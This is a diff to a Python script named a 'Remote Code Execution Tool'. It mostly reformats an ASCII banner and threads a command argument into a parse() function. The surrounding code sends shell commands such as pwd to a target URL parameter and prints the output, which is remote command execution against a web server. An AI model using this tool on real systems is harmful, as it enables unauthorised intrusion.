@@ -20,33 +20,32 @@ oldDir=""
 parsedString=""
 history=['']
 def printHeader():
-    print ("""
-
-                                                                           /\ 
-                                                                          /==\ 
-                                                                          |  |
-                                                                          |  |
-                                                                         /____\ 
-                                                                         | |R |
-                                                                         | |O |
-                                                                         | |C |
-                                                                         | |E |
-                                                                        /| |T |\ 
-		$$$$$$$\             $$$$$$\  $$$$$$$$\ $$$$$$$$\      / | |  | \ 
-		$$  __$$\           $$  __$$\ $$  _____|\__$$  __|    /__|_|__|__\ 
-		$$ |  $$ | $$$$$$\  $$ /  \__|$$ |         $$ |          /_\/_\/
-		$$$$$$$  |$$  __$$\ $$ |      $$$$$\       $$ |          ######
-		$$  __$$< $$ /  $$ |$$ |      $$  __|      $$ |         ########
-		$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |         $$ |          ######
-		$$ |  $$ |\$$$$$$  |\$$$$$$  |$$$$$$$$\    $$ |           ####
-		\__|  \__| \______/  \______/ \________|   \__|            ##
-                                                                           ##
-                Remote			Code	Execution	Tool       ##
+    print ("""                                            
+                                                           /\ 
+                                                          /==\ 
+                                                          |  |
+                                                          |  |
+                                                         /____\ 
+                                                         | |R |
+                                                         | |O |
+                                                         | |C |
+                                                         | |E |
+                                                        /| |T |\ 
+$$$$$$$\             $$$$$$\  $$$$$$$$\ $$$$$$$$\      / | |  | \ 
+$$  __$$\           $$  __$$\ $$  _____|\__$$  __|    /__|_|__|__\ 
+$$ |  $$ | $$$$$$\  $$ /  \__|$$ |         $$ |          /_\/_\/
+$$$$$$$  |$$  __$$\ $$ |      $$$$$\       $$ |          ######
+$$  __$$< $$ /  $$ |$$ |      $$  __|      $$ |         ########
+$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |         $$ |          ######
+$$ |  $$ |\$$$$$$  |\$$$$$$  |$$$$$$$$\    $$ |           ####
+\__|  \__| \______/  \______/ \________|   \__|            ##
+                                                           ##
+Remote		      Code     Execution   Tool            ##
     """)
 
 
 
-def parse(temp):   
+def parse(temp, command):   
     parsedString=""
     repeatString="" 
     seperate = '<'
@@ -79,7 +78,7 @@ def pwd():
     command = "pwd"
     url = args.url + args.variable+"="+command
     temp = curl(url)
-    parsedString = parse(temp)
+    parsedString = parse(temp, command)
     parsedString = parsedString.splitlines()
     parsedString = parsedString[0].split(" ")
     return parsedString[0]
@@ -88,7 +87,7 @@ def run_cmd(command):
     command = command.replace(" ", "%20")
     url = args.url + args.variable+"="+command
     temp = curl(url)
-    parsedString = parse(temp)
+    parsedString = parse(temp, command)
     print parsedString
 
 printHeader()
